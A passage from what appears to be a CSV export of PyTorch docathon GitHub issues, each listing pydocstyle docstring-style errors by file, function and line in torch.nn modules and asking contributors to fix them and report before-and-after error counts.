- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: First line should be in imperative mood (perhaps 'Allow', not 'Allows')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: First line should end with a period (not 'P')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_default_broadcast_coalesced`, **Line**: 2052, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_default_broadcast_coalesced`, **Line**: 2052, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_data_parallel_params`, **Line**: 2120, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_data_parallel_params`, **Line**: 2120, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: First line should be in imperative mood; try rephrasing (found 'It')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_remove_autograd_hooks`, **Line**: 2219, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_remove_autograd_hooks`, **Line**: 2219, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `NamedMemberAccessor`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `NamedMemberAccessor`, **Line**: 109, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_submodule`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_submodule`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_tensor`, **Line**: 164, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensor`, **Line**: 185, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `del_tensor`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensor`, **Line**: 211, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_tensors`, **Line**: 224, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensors`, **Line**: 233, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensors_dict`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `del_tensors`, **Line**: 261, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensors`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensors_dict`, **Line**: 296, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `check_keys`, **Line**: 327, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_parameters`, **Line**: 342, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_buffers`, **Line**: 351, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_tensors`, **Line**: 360, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_modules`, **Line**: 370, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/utils/init.py`, **Entity**: `skip_init`, **Line**: 6, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/init.py`, **Entity**: `skip_init`, **Line**: 6, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: First line should end with a period (not '`')

cc @carljparker",False
"Fix docstring errors in container.py, _functions.py, transformer.py, comm.py, parallel_apply.py, data_parallel.py, scatter_gather.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/container.py`, **Entity**: `Sequential`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_item_by_idx`, **Line**: 107, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 221, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_abs_string_index`, **Line**: 282, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `__repr__`, **Line**: 329, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `__repr__`, **Line**: 329, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 378, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `extend`, **Line**: 392, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `clear`, **Line**: 482, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `keys`, **Line**: 498, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `items`, **Line**: 504, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `values`, **Line**: 510, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 515, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 515, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/modules/container.py`, **Entity**: `_get_abs_string_index`, **Line**: 587, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/container.py`, **Entity**: `append`, **Line**: 640, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `extend`, **Line**: 651, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **File**: `torch/nn/modules/container.py`, **Entity**: `copy`, **Line**: 770, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `copy`, **Line**: 770, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/container.py`, **Entity**: `setdefault`, **Line**: 780, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/container.py`, **Entity**: `setdefault`, **Line**: 780, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `clear`, **Line**: 794, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `popitem`, **Line**: 810, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `popitem`, **Line**: 810, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/container.py`, **Entity**: `get`, **Line**: 821, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `fromkeys`, **Line**: 831, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/container.py`, **Entity**: `keys`, **Line**: 840, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `items`, **Line**: 845, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `values`, **Line**: 850, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/container.py`, **Entity**: `update`, **Line**: 855, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `Transformer`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `Transformer`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `forward`, **Line**: 90, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `generate_square_subsequent_mask`, **Line**: 154, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `generate_square_subsequent_mask`, **Line**: 154, **Description**: Docstring is over-indented
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `_reset_parameters`, **Line**: 160, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoder`, **Line**: 168, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoder`, **Line**: 346, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoder`, **Line**: 346, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoderLayer`, **Line**: 417, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerEncoderLayer`, **Line**: 417, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoderLayer`, **Line**: 669, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/transformer.py`, **Entity**: `TransformerDecoderLayer`, **Line**: 669, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `broadcast_coalesced`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `reduce_add`, **Line**: 62, **Description**: First line should be in imperative mood (perhaps 'Sum', not 'Sums')
- **File**: `torch/nn/parallel/comm.py`, **Entity**: `reduce_add_coalesced`, **Line**: 108, **Description**: First line should be in imperative mood (perhaps 'Sum', not 'Sums')
- **File**: `torch/nn/parallel/_functions.py`, **Entity**: `_get_stream`, **Line**: 115, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/_functions.py`, **Entity**: `_get_stream`, **Line**: 115, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/parallel_apply.py`, **Entity**: `parallel_apply`, **Line**: 31, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter`, **Line**: 36, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter`, **Line**: 36, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `scatter_kwargs`, **Line**: 72, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/parallel/scatter_gather.py`, **Entity**: `gather`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/data_parallel.py`, **Entity**: `data_parallel`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')

cc @carljparker",False
Fix docstring errors in module.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_buffer_registration_hook`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_module_registration_hook`, **Line**: 126, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_parameter_registration_hook`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_pre_hook`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_hook`, **Line**: 206, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_forward_hook`, **Line**: 206, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_backward_hook`, **Line**: 240, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_full_backward_pre_hook`, **Line**: 267, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_module_full_backward_hook`, **Line**: 304, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_forward_unimplemented`, **Line**: 353, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `__init__`, **Line**: 441, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_buffer`, **Line**: 485, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_parameter`, **Line**: 544, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `add_module`, **Line**: 590, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_submodule`, **Line**: 622, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_parameter`, **Line**: 690, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_buffer`, **Line**: 728, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_extra_state`, **Line**: 765, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `get_extra_state`, **Line**: 765, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `set_extra_state`, **Line**: 785, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/modules/module.py`, **Entity**: `apply`, **Line**: 853, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `cuda`, **Line**: 893, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `ipu`, **Line**: 912, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `xpu`, **Line**: 931, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `cpu`, **Line**: 950, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `to_empty`, **Line**: 1019, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `to`, **Line**: 1044, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `to`, **Line**: 1044, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_full_backward_pre_hook`, **Line**: 1156, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_backward_hook`, **Line**: 1203, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_full_backward_hook`, **Line**: 1229, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_get_backward_hooks`, **Line**: 1285, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_get_backward_hooks`, **Line**: 1285, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_forward_pre_hook`, **Line**: 1363, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_forward_hook`, **Line**: 1427, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_state_dict_hook`, **Line**: 1704, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_state_dict_pre_hook`, **Line**: 1715, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_save_to_state_dict`, **Line**: 1725, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/nn/modules/module.py`, **Entity**: `state_dict`, **Line**: 1762, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/module.py`, **Entity**: `state_dict`, **Line**: 1762, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_register_load_state_dict_pre_hook`, **Line**: 1841, **Description**: First line should be in imperative mood; try rephrasing (found 'These')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/module.py`, **Entity**: `register_load_state_dict_post_hook`, **Line**: 1860, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_load_from_state_dict`, **Line**: 1892, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: First line should end with a period (not 'o')
- **File**: `torch/nn/modules/module.py`, **Entity**: `load_state_dict`, **Line**: 1998, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/nn/modules/module.py`, **Entity**: `_named_members`, **Line**: 2086, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/nn/modules/module.py`, **Entity**: `parameters`, **Line**: 2100, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_parameters`, **Line**: 2130, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `buffers`, **Line**: 2158, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_buffers`, **Line**: 2181, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `children`, **Line**: 2208, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: First line should end with a period (not 'h')
- **File**: `torch/nn/modules/module.py`, **Entity**: `named_children`, **Line**: 2217, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/modules/module.py`, **Entity**: `modules`, **Line**: 2238, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
